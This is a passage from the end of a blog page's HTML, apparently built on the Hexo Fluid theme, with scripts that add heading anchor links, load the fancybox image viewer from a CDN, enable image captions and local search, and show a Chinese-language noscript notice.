    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
